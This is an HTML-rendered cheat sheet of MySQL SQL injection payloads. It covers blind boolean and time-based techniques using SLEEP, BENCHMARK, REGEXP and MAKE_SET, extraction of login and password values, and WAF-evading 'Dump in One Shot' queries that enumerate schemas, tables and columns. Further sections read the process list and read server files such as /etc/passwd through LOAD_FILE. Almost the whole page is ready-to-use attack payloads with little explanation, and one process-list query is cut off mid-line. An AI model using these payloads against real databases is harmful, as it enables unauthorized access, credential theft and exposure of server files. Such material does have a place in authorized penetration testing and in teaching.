<h3 id="MySQL-Blind-SQL-Injection-binary-query-using-REGEXP"><a href="#MySQL-Blind-SQL-Injection-binary-query-using-REGEXP" class="headerlink" title="MySQL Blind SQL Injection binary query using REGEXP."></a>MySQL Blind SQL Injection binary query using REGEXP.</h3><p><strong>Payload:</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP &quot;^a.*&quot;) THEN SLEEP(3) ELSE 1 END)); -- -</span></span><br></pre></td></tr></table></figure>
<p>Would work in the query (where the “where” clause is the injection point):</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name,price <span class="keyword">FROM</span> items <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="keyword">EXISTS</span>(<span class="keyword">SELECT</span> name <span class="keyword">FROM</span> items <span class="keyword">WHERE</span> name REGEXP &quot;^a.*&quot;) <span class="keyword">THEN</span> SLEEP(<span class="number">3</span>) <span class="keyword">ELSE</span> <span class="number">1</span> <span class="keyword">END</span>)); <span class="comment">-- -&#x27;;</span></span><br></pre></td></tr></table></figure>
<p>In said query, it will check to see if an item exists in the “name” column in the “items” database that starts with an “a”. If it will sleep for 3 seconds per item.</p>
<h3 id="MYSQL-Blind-using-a-conditional-statement"><a href="#MYSQL-Blind-using-a-conditional-statement" class="headerlink" title="MYSQL Blind using a conditional statement"></a>MYSQL Blind using a conditional statement</h3><p>TRUE: if @@version starts with a 5:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">2100935</span><span class="string">&#x27; OR IF(MID(@@version,1,1)=&#x27;</span><span class="number">5</span><span class="string">&#x27;,sleep(1),1)=&#x27;</span><span class="number">2</span></span><br><span class="line">Response:</span><br><span class="line">HTTP<span class="operator">/</span><span class="number">1.1</span> <span class="number">500</span> Internal Server Error</span><br></pre></td></tr></table></figure>
<p>False: if @@version starts with a 4:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">2100935</span><span class="string">&#x27; OR IF(MID(@@version,1,1)=&#x27;</span><span class="number">4</span><span class="string">&#x27;,sleep(1),1)=&#x27;</span><span class="number">2</span></span><br><span class="line">Response:</span><br><span class="line">HTTP<span class="operator">/</span><span class="number">1.1</span> <span class="number">200</span> OK</span><br></pre></td></tr></table></figure>
<h3 id="MYSQL-Blind-with-MAKE-SET"><a href="#MYSQL-Blind-with-MAKE-SET" class="headerlink" title="MYSQL Blind with MAKE_SET"></a>MYSQL Blind with MAKE_SET</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">AND</span> MAKE_SET(YOLO<span class="operator">&lt;</span>(<span class="keyword">SELECT</span>(length(version()))),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">AND</span> MAKE_SET(YOLO<span class="operator">&lt;</span>ascii(<span class="built_in">substring</span>(version(),POS,<span class="number">1</span>)),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">AND</span> MAKE_SET(YOLO<span class="operator">&lt;</span>(<span class="keyword">SELECT</span>(length(concat(login,password)))),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">AND</span> MAKE_SET(YOLO<span class="operator">&lt;</span>ascii(<span class="built_in">substring</span>(concat(login,password),POS,<span class="number">1</span>)),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h3 id="MYSQL-Blind-with-LIKE"><a href="#MYSQL-Blind-with-LIKE" class="headerlink" title="MYSQL Blind with LIKE"></a>MYSQL Blind with LIKE</h3><p>‘_’ acts like the regex character ‘.’, use it to speed up your blind testing</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> cust_code <span class="keyword">FROM</span> customer <span class="keyword">WHERE</span> cust_name <span class="keyword">LIKE</span> <span class="string">&#x27;k__l&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-Time-Based"><a href="#MYSQL-Time-Based" class="headerlink" title="MYSQL Time Based"></a>MYSQL Time Based</h2><p>The following SQL codes will delay the output from MySQL.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span>BENCHMARK(<span class="number">40000000</span>,SHA1(<span class="number">1337</span>))<span class="operator">+</span></span><br><span class="line"><span class="string">&#x27;%2Bbenchmark(3200,SHA1(1))%2B&#x27;</span></span><br><span class="line"><span class="keyword">AND</span> [RANDNUM]<span class="operator">=</span>BENCHMARK([SLEEPTIME]<span class="number">000000</span>,MD5(<span class="string">&#x27;[RANDSTR]&#x27;</span>))  <span class="operator">/</span><span class="operator">/</span>SHA1</span><br><span class="line">RLIKE SLEEP([SLEEPTIME])</span><br><span class="line"><span class="keyword">OR</span> ELT([RANDNUM]<span class="operator">=</span>[RANDNUM],SLEEP([SLEEPTIME]))</span><br></pre></td></tr></table></figure>
<h3 id="Using-SLEEP-in-a-subselect"><a href="#Using-SLEEP-in-a-subselect" class="headerlink" title="Using SLEEP in a subselect"></a>Using SLEEP in a subselect</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;%&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;___&#x27;</span>)# </span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;____&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;_____&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;a____&#x27;</span>)#</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;s____&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;sa___&#x27;</span>)#</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;sw___&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;swa__&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;swb__&#x27;</span>)#</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> database() <span class="keyword">like</span> <span class="string">&#x27;swi__&#x27;</span>)#</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> sleep(<span class="number">10</span>) <span class="keyword">from</span> dual <span class="keyword">where</span> (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> column_name <span class="keyword">like</span> <span class="string">&#x27;%pass%&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>) <span class="keyword">like</span> <span class="string">&#x27;%&#x27;</span>)#</span><br></pre></td></tr></table></figure>

<h3 id="Using-conditional-statements"><a href="#Using-conditional-statements" class="headerlink" title="Using conditional statements"></a>Using conditional statements</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> IF(ASCII(<span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> <span class="keyword">USER</span>()),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">&gt;=</span><span class="number">100</span>,<span class="number">1</span>, BENCHMARK(<span class="number">2000000</span>,MD5(NOW()))) <span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> IF(ASCII(<span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> <span class="keyword">USER</span>()), <span class="number">1</span>, <span class="number">1</span>)))<span class="operator">&gt;=</span><span class="number">100</span>, <span class="number">1</span>, SLEEP(<span class="number">3</span>)) <span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">OR</span> IF(MID(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;5&#x27;</span>,sleep(<span class="number">1</span>),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;2</span></span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-DIOS-Dump-in-One-Shot"><a href="#MYSQL-DIOS-Dump-in-One-Shot" class="headerlink" title="MYSQL DIOS - Dump in One Shot"></a>MYSQL DIOS - Dump in One Shot</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> (@) <span class="keyword">from</span> (<span class="keyword">select</span>(@:<span class="operator">=</span><span class="number">0x00</span>),(<span class="keyword">select</span> (@) <span class="keyword">from</span> (information_schema.columns) <span class="keyword">where</span> (table_schema<span class="operator">&gt;=</span>@) <span class="keyword">and</span> (@)<span class="keyword">in</span> (@:<span class="operator">=</span>concat(@,<span class="number">0x0D</span>,<span class="number">0x0A</span>,<span class="string">&#x27; [ &#x27;</span>,table_schema,<span class="string">&#x27; ] &gt; &#x27;</span>,table_name,<span class="string">&#x27; &gt; &#x27;</span>,column_name,<span class="number">0x7C</span>))))a)#</span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> (@) <span class="keyword">from</span> (<span class="keyword">select</span>(@:<span class="operator">=</span><span class="number">0x00</span>),(<span class="keyword">select</span> (@) <span class="keyword">from</span> (db_data.table_data) <span class="keyword">where</span> (@)<span class="keyword">in</span> (@:<span class="operator">=</span>concat(@,<span class="number">0x0D</span>,<span class="number">0x0A</span>,<span class="number">0x7C</span>,<span class="string">&#x27; [ &#x27;</span>,column_data1,<span class="string">&#x27; ] &gt; &#x27;</span>,column_data2,<span class="string">&#x27; &gt; &#x27;</span>,<span class="number">0x7C</span>))))a)#</span><br><span class="line"></span><br><span class="line"><span class="comment">-- SecurityIdiots</span></span><br><span class="line">make_set(<span class="number">6</span>,@:<span class="operator">=</span><span class="number">0x0a</span>,(<span class="keyword">select</span>(<span class="number">1</span>)<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>@:<span class="operator">=</span>make_set(<span class="number">511</span>,@,<span class="number">0x3c6c693e</span>,table_name,column_name)),@)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Profexer</span></span><br><span class="line">(<span class="keyword">select</span>(@)<span class="keyword">from</span>(<span class="keyword">select</span>(@:<span class="operator">=</span><span class="number">0x00</span>),(<span class="keyword">select</span>(@)<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(@)<span class="keyword">in</span>(@:<span class="operator">=</span>concat(@,<span class="number">0x3C62723E</span>,table_name,<span class="number">0x3a</span>,column_name))))a)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Dr.Z3r0</span></span><br><span class="line">(<span class="keyword">select</span>(<span class="keyword">select</span> concat(@:<span class="operator">=</span><span class="number">0xa7</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>)<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(@:<span class="operator">=</span>concat(@,<span class="number">0x3c6c693e</span>,table_name,<span class="number">0x3a</span>,column_name))),@))</span><br><span class="line"></span><br><span class="line"><span class="comment">-- M@dBl00d</span></span><br><span class="line">(<span class="keyword">Select</span> export_set(<span class="number">5</span>,@:<span class="operator">=</span><span class="number">0</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>)<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>@:<span class="operator">=</span>export_set(<span class="number">5</span>,export_set(<span class="number">5</span>,@,table_name,<span class="number">0x3c6c693e</span>,<span class="number">2</span>),column_name,<span class="number">0xa3a</span>,<span class="number">2</span>)),@,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Zen</span></span><br><span class="line"><span class="operator">+</span>make_set(<span class="number">6</span>,@:<span class="operator">=</span><span class="number">0x0a</span>,(<span class="keyword">select</span>(<span class="number">1</span>)<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>@:<span class="operator">=</span>make_set(<span class="number">511</span>,@,<span class="number">0x3c6c693e</span>,table_name,column_name)),@)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Zen WAF</span></span><br><span class="line">(<span class="comment">/*!12345sELecT*/</span>(@)<span class="keyword">from</span>(<span class="comment">/*!12345sELecT*/</span>(@:<span class="operator">=</span><span class="number">0x00</span>),(<span class="comment">/*!12345sELecT*/</span>(@)<span class="keyword">from</span>(`InFoRMAtiON_sCHeMa`.`ColUMNs`)<span class="keyword">where</span>(`TAblE_sCHemA`<span class="operator">=</span>DatAbAsE<span class="comment">/*data*/</span>())<span class="keyword">and</span>(@)<span class="keyword">in</span>(@:<span class="operator">=</span>CoNCat<span class="operator">%</span><span class="number">0</span>a(@,<span class="number">0x3c62723e5461626c6520466f756e64203a20</span>,TaBLe_nAMe,<span class="number">0x3a3a</span>,column_name))))a)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ~tr0jAn WAF</span></span><br><span class="line"><span class="operator">+</span>concat<span class="comment">/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/</span>(<span class="variable">@x</span>)<span class="comment">/*!from*/</span>(<span class="comment">/*!12345selEcT*/</span>(<span class="variable">@x</span>:<span class="operator">=</span><span class="number">0x00</span>),(<span class="variable">@r</span>:<span class="operator">=</span><span class="number">0</span>),(<span class="variable">@running</span>_number:<span class="operator">=</span><span class="number">0</span>),(<span class="variable">@tbl</span>:<span class="operator">=</span><span class="number">0x00</span>),(<span class="comment">/*!12345selEcT*/</span>(<span class="number">0</span>) <span class="keyword">from</span>(information_schema.<span class="comment">/**/</span>columns)<span class="keyword">where</span>(table_schema<span class="operator">=</span>database()) <span class="keyword">and</span>(<span class="number">0x00</span>)<span class="keyword">in</span>(<span class="variable">@x</span>:<span class="operator">=</span>Concat<span class="comment">/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/</span><span class="operator">+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- ~tr0jAn Benchmark</span></span><br><span class="line"><span class="operator">+</span>concat(<span class="number">0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20</span>,version(),<span class="number">0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.schemata),<span class="number">0x3c2f666f6e743e3c2f666f6e743e</span>,<span class="number">0x202d2d203a2d20</span>,concat(<span class="variable">@sc</span>:<span class="operator">=</span><span class="number">0x00</span>,<span class="variable">@scc</span>:<span class="operator">=</span><span class="number">0x00</span>,<span class="variable">@r</span>:<span class="operator">=</span><span class="number">0</span>,benchmark(<span class="variable">@a</span>:<span class="operator">=</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.schemata),<span class="variable">@scc</span>:<span class="operator">=</span>concat(<span class="variable">@scc</span>,<span class="number">0x3c62723e3c62723e</span>,<span class="number">0x3c666f6e7420636f6c6f723d7265643e</span>,LPAD(<span class="variable">@r</span>:<span class="operator">=</span><span class="variable">@r</span><span class="operator">%</span><span class="number">2</span>b1,<span class="number">3</span>,<span class="number">0x30</span>),<span class="number">0x2e20</span>,(<span class="keyword">Select</span> concat(<span class="number">0x3c623e</span>,<span class="variable">@sc</span>:<span class="operator">=</span>schema_name,<span class="number">0x3c2f623e</span>) <span class="keyword">from</span> information_schema.schemata <span class="keyword">where</span> schema_name<span class="operator">&gt;</span><span class="variable">@sc</span> <span class="keyword">order</span> <span class="keyword">by</span> schema_name limit <span class="number">1</span>),<span class="number">0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_Schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="variable">@sc</span>),<span class="number">0x29</span>,<span class="number">0x3c2f666f6e743e</span>,<span class="number">0x202e2e2e20</span> ,<span class="variable">@t</span>:<span class="operator">=</span><span class="number">0x00</span>,<span class="variable">@tt</span>:<span class="operator">=</span><span class="number">0x00</span>,<span class="variable">@tr</span>:<span class="operator">=</span><span class="number">0</span>,benchmark((<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_Schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="variable">@sc</span>),<span class="variable">@tt</span>:<span class="operator">=</span>concat(<span class="variable">@tt</span>,<span class="number">0x3c62723e</span>,<span class="number">0x3c666f6e7420636f6c6f723d677265656e3e</span>,LPAD(<span class="variable">@tr</span>:<span class="operator">=</span><span class="variable">@tr</span><span class="operator">%</span><span class="number">2</span>b1,<span class="number">3</span>,<span class="number">0x30</span>),<span class="number">0x2e20</span>,(<span class="keyword">select</span> concat(<span class="number">0x3c623e</span>,<span class="variable">@t</span>:<span class="operator">=</span>table_name,<span class="number">0x3c2f623e</span>) <span class="keyword">from</span> information_Schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="variable">@sc</span> <span class="keyword">and</span> table_name<span class="operator">&gt;</span><span class="variable">@t</span> <span class="keyword">order</span> <span class="keyword">by</span> table_name limit <span class="number">1</span>),<span class="number">0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_Schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="variable">@t</span>),<span class="number">0x29</span>,<span class="number">0x3c2f666f6e743e</span>,<span class="number">0x202d2d3a20</span>,<span class="variable">@c</span>:<span class="operator">=</span><span class="number">0x00</span>,<span class="variable">@cc</span>:<span class="operator">=</span><span class="number">0x00</span>,<span class="variable">@cr</span>:<span class="operator">=</span><span class="number">0</span>,benchmark((<span class="keyword">Select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="variable">@sc</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="variable">@t</span>),<span class="variable">@cc</span>:<span class="operator">=</span>concat(<span class="variable">@cc</span>,<span class="number">0x3c62723e</span>,<span class="number">0x3c666f6e7420636f6c6f723d707572706c653e</span>,LPAD(<span class="variable">@cr</span>:<span class="operator">=</span><span class="variable">@cr</span><span class="operator">%</span><span class="number">2</span>b1,<span class="number">3</span>,<span class="number">0x30</span>),<span class="number">0x2e20</span>,(<span class="keyword">Select</span> (<span class="variable">@c</span>:<span class="operator">=</span>column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="variable">@sc</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="variable">@t</span> <span class="keyword">and</span> column_name<span class="operator">&gt;</span><span class="variable">@c</span> <span class="keyword">order</span> <span class="keyword">by</span> column_name LIMIT <span class="number">1</span>),<span class="number">0x3c2f666f6e743e</span>)),<span class="variable">@cc</span>,<span class="number">0x3c62723e</span>)),<span class="variable">@tt</span>)),<span class="variable">@scc</span>),<span class="number">0x3c62723e3c62723e</span>,<span class="number">0x3c62723e3c62723e</span>)<span class="operator">+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- N1Z4M WAF</span></span><br><span class="line"><span class="operator">+</span><span class="comment">/*!13337concat*/</span>(<span class="number">0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e</span>,database<span class="comment">/**N1Z4M**/</span>(),<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e</span>,@<span class="variable">@version</span>,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e</span>,<span class="keyword">user</span><span class="comment">/**N1Z4M**/</span>(),<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e</span>,@<span class="variable">@port</span>,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e</span>,@<span class="variable">@version</span>_compile_os,<span class="number">0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e</span>,@<span class="variable">@datadir</span>,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e</span>,UUID<span class="comment">/**N1Z4M**/</span>(),<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e</span>,<span class="built_in">current_user</span><span class="comment">/**N1Z4M**/</span>(),<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e</span>,@<span class="variable">@tmpdir</span>,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e</span>,@<span class="variable">@version</span>_compile_machine,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e</span>,@<span class="variable">@CHARACTER</span>_SET_FILESYSTEM,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e</span>,@<span class="variable">@hostname</span>,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e</span>,UUID<span class="comment">/**N1Z4M**/</span>(),<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e</span>,@<span class="variable">@GLOBAL</span>.have_symlink,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e</span>,@<span class="variable">@GLOBAL</span>.have_ssl,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e</span>,@<span class="variable">@basedir</span>,<span class="number">0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e</span>,(<span class="comment">/*!13337select*/</span>(<span class="variable">@a</span>)<span class="comment">/*!13337from*/</span>(<span class="comment">/*!13337select*/</span>(<span class="variable">@a</span>:<span class="operator">=</span><span class="number">0x00</span>),(<span class="comment">/*!13337select*/</span>(<span class="variable">@a</span>)<span class="comment">/*!13337from*/</span>(information_schema.columns)<span class="comment">/*!13337where*/</span>(table_schema<span class="operator">!=</span><span class="number">0x696e666f726d6174696f6e5f736368656d61</span>)<span class="keyword">and</span>(<span class="variable">@a</span>)<span class="keyword">in</span>(<span class="variable">@a</span>:<span class="operator">=</span><span class="comment">/*!13337concat*/</span>(<span class="variable">@a</span>,table_schema,<span class="number">0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e</span>,table_name,<span class="number">0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e</span>,column_name,<span class="number">0x3c62723e</span>))))a))<span class="operator">+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- sharik</span></span><br><span class="line">(<span class="keyword">select</span>(<span class="variable">@a</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(<span class="variable">@a</span>:<span class="operator">=</span><span class="number">0x00</span>),(<span class="keyword">select</span>(<span class="variable">@a</span>)<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_schema<span class="operator">!=</span><span class="number">0x696e666f726d6174696f6e5f736368656d61</span>)<span class="keyword">and</span>(<span class="variable">@a</span>)<span class="keyword">in</span>(<span class="variable">@a</span>:<span class="operator">=</span>concat(<span class="variable">@a</span>,table_name,<span class="number">0x203a3a20</span>,column_name,<span class="number">0x3c62723e</span>))))a)</span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-Current-queries"><a href="#MYSQL-Current-queries" class="headerlink" title="MYSQL Current queries"></a>MYSQL Current queries</h2><p>This table can list all operations that DB is performing at the moment.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="number">1</span>,state,info,<span class="number">4</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.PROCESSLIST #</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Dump in one shot example for the table content.</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span>(@)<span class="keyword">from</span>(<span class="keyword">select</span>(@:<span class="operator">=</span><span class="number">0x00</span>),(<span class="keyword">select</span>(@)<span class="keyword">from</span>(information_schema.processlist)<span class="keyword">where</span>(@)<span class="keyword">in</span>(@:<span class="operator">=</span>concat(@,<span class="number">0x3C62723E</span>,state,<span class="number">0x3a</span>,</span><br></pre></td></tr></table></figure>

<h2 id="MYSQL-Read-content-of-a-file"><a href="#MYSQL-Read-content-of-a-file" class="headerlink" title="MYSQL Read content of a file"></a>MYSQL Read content of a file</h2><p>Need the filepriv, otherwise you will get the error : ERROR 1290 (HY000): The MySQL server is running with the –secure-file-priv option so it cannot execute this statement</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION ALL SELECT LOAD_FILE(&#x27;</span><span class="operator">/</span>etc<span class="operator">/</span>passwd<span class="string">&#x27;) --</span></span><br><span class="line"><span class="string">UNION ALL SELECT TO_base64(LOAD_FILE(&#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>index.php<span class="string">&#x27;));</span></span><br></pre></td></tr></table></figure>
<p>If you are root on the database, you can re-enable the LOAD_FILE using the following query</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> FILE <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>; FLUSH PRIVILEGES;#</span><br></pre></td></tr></table></figure>
